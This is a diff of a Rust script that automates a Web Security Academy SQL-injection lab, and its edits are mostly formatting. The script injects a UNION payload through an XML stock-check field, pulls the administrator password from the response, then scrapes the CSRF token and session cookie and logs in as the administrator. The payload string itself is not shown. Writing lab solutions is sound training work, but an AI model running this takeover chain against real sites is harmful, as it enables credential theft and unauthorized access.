@@ -6,7 +6,7 @@
 *
 * Lab: SQL injection with filter bypass via XML encoding
 *
-* Steps: 1. Inject payload into storeId XML element to retrieve administrator password 
+* Steps: 1. Inject payload into storeId XML element to retrieve administrator password
 *           using UNION-based attack
 *        2. Extract administrator password from the response body
 *        3. Fetch the login page
@@ -39,6 +39,7 @@ use text_colorizer::Colorize;
 fn main() {
     // change this to your lab URL
     let url = "https://0a2a00f50452bb9281ea8970007d00b8.web-security-academy.net";
+
     // build the client that will be used for all subsequent requests
     let client = build_client();
 
@@ -55,6 +56,7 @@ fn main() {
             .white(),
     );
     io::stdout().flush();
+
     // fetch the page with the injected payload
     let injection = client
         .post(format!("{url}/product/stock"))
@@ -65,15 +67,17 @@ fn main() {
             "{}",
             "[!] Failed to fetch the page with the injected payload".red()
         ));
-    println!("{}", "OK".green());
 
+    println!("{}", "OK".green());
     print!(
         "{}",
         "2. Extracting administrator password from the response.. ".white(),
     );
     io::stdout().flush();
-    // body of the response
+
+    // get the body of the response
     let body = injection.text().unwrap();
+
     // extract administrator password.
     // if the pattern not work, change it to "(.*)\n",
     // it depends on how the password is retrieved, after the the number of units or before them
@@ -82,23 +86,24 @@ fn main() {
         "{}",
         "[!] Failed to extract administrator password".red()
     ));
-    println!("{} => {}", "OK".green(), admin_password.yellow());
-    // println!("{}", body);
 
+    println!("{} => {}", "OK".green(), admin_password.yellow());
     print!("{}", "3. Fetching login page.. ".white());
     io::stdout().flush();
+
     // fetch the login page
     let fetch_login = client
         .get(format!("{url}/login"))
         .send()
         .expect(&format!("{}", "[!] Failed to fetch login page".red()));
-    println!("{}", "OK".green());
 
+    println!("{}", "OK".green());
     print!(
         "{}",
         "4. Extracting csrf token and session cookie.. ".white()
     );
     io::stdout().flush();
+
     // extract session cookie
     let session = extract_session_cookie(fetch_login.headers())
         .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
@@ -106,10 +111,11 @@ fn main() {
     // extract csrf token
     let csrf =
         extract_csrf(fetch_login).expect(&format!("{}", "[!] Failed to extract csrf token".red()));
-    println!("{}", "OK".green());
 
+    println!("{}", "OK".green());
     print!("{}", "5. Logging in as the administrator.. ".white(),);
     io::stdout().flush();
+
     // login as the administrator
     let admin_login = client
         .post(format!("{url}/login"))
@@ -124,6 +130,7 @@ fn main() {
             "{}",
             "[!] Failed to login as the administrator".red()
         ));
+
     println!("{}", "OK".green());
 
     // extract the new session
@@ -132,9 +139,10 @@ fn main() {
         "[!] Failed to extract new session cookie".red()
     ));
 
-    // fetch administrator page
     print!("{}", "6. Fetching the administrator profile.. ".white(),);
     io::stdout().flush();
+
+    // fetch administrator page
     let admin = client
         .get(format!("{url}/my-account"))
         .header("Cookie", format!("session={new_session}"))
@@ -143,8 +151,8 @@ fn main() {
             "{}",
             "[!] Failed to fetch administrator profile".red()
         ));
-    println!("{}", "OK".green());
 
+    println!("{}", "OK".green());
     println!(
         "{} {}",
         "🗹 Check your browser, it should be marked now as"
@@ -203,7 +211,6 @@ fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
         None
     }
 }
-
 
 /*******************************************
 * Function to extract a pattern form a text
